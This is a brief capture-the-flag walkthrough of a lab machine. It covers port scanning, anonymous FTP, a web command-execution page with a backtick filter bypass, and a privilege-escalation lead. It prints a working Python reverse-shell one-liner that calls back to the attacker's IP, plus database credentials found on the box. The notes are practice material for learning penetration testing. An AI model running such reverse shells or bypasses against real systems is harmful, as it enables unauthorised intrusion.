start with nmap

21
22
80

***

ftp 21

anonymous login is success.

found note.txt

`Anurodh told me that there is some filtering on strings being put in the command -- Apaar`

user found:

anurodh
apaar


***

http 80

ffuf

/secret --> cmd exection.

like `note.txt` said there are some filtering on strings.

three users on box:

anurodh 
apaar 
aurick


dir -a /home/apaar/.ssh

we can run any cmd using echo \`cmd\`


```
echo `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.9.112",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` 
```
## privs

in /var/www/files/index.php found creds for mysql

```
$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");

```

we can run .helpline.sh as apaar

``(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh`